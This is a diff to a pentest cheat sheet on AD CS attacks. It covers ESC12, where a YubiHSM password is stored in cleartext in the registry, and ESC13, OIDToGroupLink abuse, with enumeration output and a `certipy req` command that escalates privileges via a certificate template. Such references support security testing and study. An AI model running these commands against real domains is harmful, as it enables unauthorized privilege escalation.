@@ -673,11 +673,11 @@ $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -s
 
 Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".
 
-If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.
+If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM. 
 
 This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.
 
-Everything is explained [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
+Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
 
 ### Abuse Scenario
 
@@ -704,37 +704,42 @@ The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added 
 
 In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group. 
 
-You can use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
+Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
 
 ```powershell
 Enumerating OIDs
 ------------------------
-OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 
 OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
-OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
 OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
-OID msDS-OIDToGroupLink: CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 ------------------------
 Enumerating certificate templates
 ------------------------
-Certificate template ManagerAuthentication may be used to obtain membership of CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 
-Certificate template Name: ManagerAuthentication
+Certificate template Name: VulnerableTemplate
 OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
-OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
 OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
-OID msDS-OIDToGroupLink: CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 ------------------------
 ```
 
 ### Abuse Scenario
 
-All you need to do just specify the template, you will get a certificate with OIDToGroupLink rights.
+Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.
+
+If `John` have have permission to enroll `VulnerableTemplate`,  the user can inherit the privileges of `VulnerableGroup` group. 
+
+All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.
 
 ```bash
-certipy req -u "mane@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'Vulnerable template'
+certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
+
 
 ## Compromising Forests with Certificates Explained in Passive Voice
 
